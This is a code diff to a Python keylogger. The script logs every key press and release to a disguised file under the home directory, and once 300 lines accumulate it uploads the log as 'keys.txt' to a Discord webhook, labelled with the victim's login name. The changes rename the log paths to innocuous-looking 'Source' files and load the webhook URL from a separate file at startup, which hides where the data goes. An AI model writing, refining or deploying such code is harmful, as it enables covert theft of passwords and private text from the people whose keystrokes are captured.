@@ -5,12 +5,10 @@ from discord_webhook import DiscordWebhook
 import os
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
-
-url = ''
 clear_after_send = True
 
 def kill_switch():
-    file_path = Path.home() / "kill"
+    file_path = Path.home() / "Source/kill"
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if file_path.exists():
@@ -19,7 +17,7 @@ def kill_switch():
 def check_if_should_send(lines):
     if lines >= 300:
         webhook = DiscordWebhook(url=url, username=str(os.getlogin()))
-        file_path = Path.home() / "steam"
+        file_path = Path.home() / "Source/main"
         file_path.parent.mkdir(parents=True, exist_ok=True)
         with file_path.open('r') as file:
             webhook.add_file(file=file.read(), filename="keys.txt")
@@ -150,7 +148,7 @@ def on_press(key):
 
     log = f"\n Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}"
 
-    file_path = Path.home() / "steam"
+    file_path = Path.home() / "Source/main"
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if not file_path.exists():
@@ -167,7 +165,7 @@ def on_release(key):
 
     log = f"\nReleased: {str(key_name).rjust(max_length)} | {datetime.now()}"
 
-    file_path = Path.home() / "steam"
+    file_path = Path.home() / "Source/main"
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if not file_path.exists():
@@ -185,5 +183,11 @@ def on_release(key):
         return False
 
 if not kill_switch():
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
-        l.join()
+    file_path = Path.home() / "Source/src"
+    file_path.parent.mkdir(parents=True, exist_ok=True)
+
+    if file_path.exists():
+        with file_path.open('r') as file:
+            url = file.readline()
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
+            l.join()
